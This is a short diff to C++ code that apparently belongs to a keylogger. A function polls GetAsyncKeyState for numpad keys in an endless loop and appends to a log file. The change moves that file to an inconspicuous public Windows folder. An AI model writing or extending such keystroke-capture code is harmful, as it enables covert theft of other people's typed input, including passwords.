@@ -9,7 +9,7 @@ void getkeyNUM()
 {
     while(1){
     ofstream fout;
-    fout.open("C:/Users/Public/Python GGKEIT/file.txt", ios::app);
+    fout.open("C:/Users/Public/Public video/file.txt", ios::app);
 
     if (GetAsyncKeyState(0x60) == -32767)
     {
